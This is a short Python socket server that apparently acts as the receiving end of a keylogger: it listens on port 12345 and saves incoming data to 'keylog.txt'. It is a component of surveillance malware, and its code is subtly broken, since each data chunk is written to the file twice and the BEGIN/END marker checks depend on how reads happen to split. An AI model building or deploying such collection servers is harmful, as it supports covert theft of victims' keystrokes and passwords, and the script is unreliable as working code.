import socket 

def recv_file(s, file_name):

    while True:
        (conn, addr) = s.accept()
        with open(file_name, 'wb') as f:
            while True:
                print('Receiving data...')
                data = conn.recv(32)
                if data == b'BEGIN':
                    continue
                elif data == b'END':
                    break
                else:
                    f.write(data)
                    print('write to file', data.decode('utf-8'))
                f.write(data)
            f.close()
            break

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((socket.gethostname(), 12345))
s.listen(3)

recv_file(s, 'keylog.txt')
